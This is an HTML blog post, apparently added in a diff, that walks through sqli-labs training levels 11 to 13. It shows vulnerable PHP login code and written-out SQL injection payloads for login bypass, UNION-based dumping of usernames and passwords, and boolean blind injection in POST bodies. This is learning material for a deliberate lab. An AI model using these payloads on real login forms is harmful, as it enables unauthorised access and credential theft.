@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="zh-cmn-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <title>POST注入入门-Less-11-13 | Joner的博客</title>
+  
+  
+  
+  <!--link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css"-->
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/highlight.js/9.10.0/styles/github-gist.min.css">
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+<div class="Shell">
+    <aside class="SideBar">
+    <section class="avatar" style="background-image: url()">
+        <div class="av-pic" style="background-image: url()">
+        </div>
+    </section>
+    <section class="menu">
+        <div>Joner的博客</div>
+        
+            <div>通透</div>
+        
+        <ul>
+          
+            <a href="/" class="Btn">
+              <li>Home</li>
+            </a>  
+          
+            <a href="/archives/" class="Btn">
+              <li>Archive</li>
+            </a>  
+          
+        </ul>
+    </section>
+    <section class="media">
+        
+    </section>
+</aside>
+
+    <div class="container">
+        <div data-pager-shell>
+            <div>
+  <article class="ContentView">
+    <header class="PageTitle">
+        <h1>POST注入入门-Less-11-13</h1>
+    </header>
+
+    <section>
+      <h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><blockquote>
+<p> POST</p>
+<p> POST方式就是将数据从客户端提交到服务器端，数据以表单形式提交</p>
+</blockquote>
+<a id="more"></a>
+<p>打开Less-11关卡，界面如图所示</p>
+<p><img src="/2019/04/14/POST注入入门-Less-11-13/D:/Entertainment\STU\Bolg\source\_posts\POST注入入门-Less-11-13\POST.png" alt></p>
+<p>下面使用之前10关上闭合语句的方法，如果这个语句判断的是用户名和密码是否匹配，那么可以将匹配密码这一段注释掉，并且该为真语句，那就实现了绕过了判断，进入到登录界面。</p>
+<p><img src="/2019/04/14/POST注入入门-Less-11-13/D:/Entertainment\STU\Bolg\source\_posts\POST注入入门-Less-11-13\2.png" alt></p>
+<p>提交后提示<code>Your Login name:admin
+Your Password:admin</code></p>
+<p>这样实际是直接将后面语句注释掉之后就进入了登陆界面，下面看一下代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@$sql=<span class="string">"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br></pre></td></tr></table></figure>
+<p>这里将<code>$uname</code>替换成<code>admin &#39;#</code>后，闭合了语句，并且注释了后面的语句，其中数据库中有<code>admin</code>所以语句正确执行，进入登录后的界面，同样这个地方也能执行其他sql语句。这里使用union注入进行尝试，username输入<code>aaa&#39;union select 1,database() #</code>,密码任意。</p>
+<p>输入后显示<code>Your Login name:1
+Your Password:security</code>这里爆出了数据库的名字</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">aaa' order by 3 <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">aaa' union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">aaa<span class="string">' union select 1,group_concat(column_name)  from information_schema.columns where table_name='</span><span class="keyword">users</span><span class="string">' #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">aaa '</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">id</span>,<span class="string">'-'</span>,username,<span class="string">'-'</span>,<span class="keyword">password</span>)  <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br></pre></td></tr></table></figure>
+<h2 id="less-12"><a href="#less-12" class="headerlink" title="less-12"></a>less-12</h2><p>在username上输入<code>admin &#39; #</code>后没有反应，输入<code>admin &quot; #</code>后显示错误信息，<code>You
+have an error in your SQL syntax; check the manual that corresponds to 
+your MySQL server version for the right syntax to use near &#39;&#39; at line 1</code></p>
+<p>使用其他万能密码进行尝试<code>admin &quot;) #</code>,密码随便，登陆成功，查看源码</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$uname='"'.$uname.'"';</span><br><span class="line">	$passwd='"'.$passwd.'"'; </span><br><span class="line">	@$sql="<span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=($uname) <span class="keyword">and</span> <span class="keyword">password</span>=($passwd) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span><span class="string">";</span></span><br></pre></td></tr></table></figure>
+<p>所以后面注入的语句只需要修改闭合语句就可以。</p>
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>username输入<code>admin &#39;#</code>,报错<code>You
+have an error in your SQL syntax; check the manual that corresponds to 
+your MySQL server version for the right syntax to use near &#39;&#39; at line 1</code></p>
+<p>通过这个错误也没看出用什么来闭合，用<code>admin &#39;) #</code>尝试后成功。</p>
+<p>然后这里看到并没有出现什么数据，只是有个图片提示登录成功，所以推测是盲注，这里使用布尔盲注，并使用HackBar插件。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">uname=admin ') and left(database(),1)&gt;'a' #&amp;passwd=123132&amp;submit=Submit</span><br><span class="line"><span class="comment">#猜测数据库名</span></span><br><span class="line">uname=admin ') and left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)&gt;<span class="string">'a'</span> <span class="comment">#&amp;passwd=123132&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#猜测所有的表名，修改limit 0，1 中的数据猜测不同的表</span></span><br><span class="line">uname=<span class="keyword">admin</span> <span class="string">') and left((select column_name from information_schema.columns where table_name='</span><span class="keyword">user</span><span class="string">' limit 0,1),1)&gt;'</span>a<span class="string">' #&amp;passwd=123132&amp;submit=Submit</span></span><br><span class="line"><span class="string">#猜测user表中的列名</span></span><br><span class="line"><span class="string">uname=admin '</span>)<span class="keyword">and</span> <span class="keyword">ORD</span>(<span class="keyword">MID</span>((<span class="keyword">SELECT</span> <span class="keyword">IFNULL</span>(<span class="keyword">CAST</span>(username <span class="keyword">AS</span> <span class="built_in">CHAR</span>),<span class="number">0x20</span>)<span class="keyword">FROM</span> security.users <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="string">'a'</span><span class="comment">#&amp;passwd=123132&amp;submit=Submit</span></span><br><span class="line"><span class="comment">#猜测数据</span></span><br></pre></td></tr></table></figure>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总体来看，前面几关没有什么特别的地方，注入的语句都是和Less-1以及后面的几关类似。</p>
+
+
+      
+
+    </section>
+    
+      <section class="ArticleMeta">
+          <div>
+            发布于&nbsp;
+            <time datetime="2019-04-14T12:23:38.000Z" itemprop="datePublished">
+              2019-04-14
+            </time>
+          </div>
+          
+            <div>
+              tags: 
+  <li class="meta-text">
+  { <a href="/tags/sqli-labs/">sqli-labs</a> }
+  </li>
+
+  <li class="meta-text">
+  { <a href="/tags/POST注入/">POST注入</a> }
+  </li>
+
+
+            </div>
+          
+      </section>
+    
+    
+</article>
+
+  
+</div>
+
+            <footer>
+    <div>© 2019 - Joner </div>
+    <div>
+        <span>
+            Powered by <a href="https://hexo.io">Hexo</a>
+        </span>
+        ,
+        <span>
+            Theme - <a href="https://github.com/nameoverflow/hexo-theme-icalm">Icalm</a>
+        </span>
+    </div>
+</footer>
+
+        </div>
+    </div>
+</div>
+<script src="/js/pager/dist/singlepager.js"></script>
+<script>
+var sp = new Pager('data-pager-shell')
+
+</script>
+</body>
+</html>
